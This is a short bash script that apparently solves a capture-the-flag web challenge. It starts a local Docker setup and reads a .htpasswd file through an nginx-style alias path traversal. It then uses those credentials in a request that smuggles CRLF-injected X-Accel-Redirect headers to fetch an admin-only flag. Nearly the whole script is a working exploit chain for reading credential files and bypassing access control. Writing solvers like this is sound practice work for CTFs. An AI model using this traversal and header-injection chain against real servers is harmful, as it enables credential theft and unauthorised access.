#!/bin/bash

if [ -n "$1" ]; then
    HOST="$1"
else
    HOST="http://localhost:3000/"
    RUN_DOCKER=1
fi

if [ -n "$RUN_DOCKER" ]; then
    docker compose build
    docker compose up -d
    sleep 5
fi

password=$(curl -s "${HOST}alias-traversal../.htpasswd" | cut -c12-)
curl -s -u "ctf:${password}" "${HOST}admin/proxy/header-injection/a%250D%250AX-Accel-Redirect:%25252Fadmin%25252Fflag%250D%250AX-Accel-Limit-Rate:0" | egrep -o 'flag{.*?}'

if [ -n "$RUN_DOCKER" ]; then
  docker compose down
fi
